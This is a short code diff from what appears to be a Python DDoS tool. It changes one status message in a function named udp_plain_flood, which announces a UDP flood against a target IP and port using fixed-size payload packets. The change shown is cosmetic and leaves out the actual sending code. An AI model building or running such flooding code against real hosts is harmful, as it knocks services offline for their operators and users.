@@ -26,7 +26,7 @@ def udp_plain_flood(ip, port, duration, packet_size):
     payload = b"A" * packet_size  # Fixed payloaf
         
     print(Fore.LIGHTBLUE_EX + f"[*] Starting UDP Plain flood on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...")
-    print(Fore.YELLOW + f"[L4] Sending {psize} bytes to {target_ip}:{port}")
+    print("\033[103m \033[44m0bject \033[0m \033[33m" +str(ip)+ " \033[32m0k..!\033[0m")
     time.sleep(0.2)
     try:
         while time.time() < end_time:
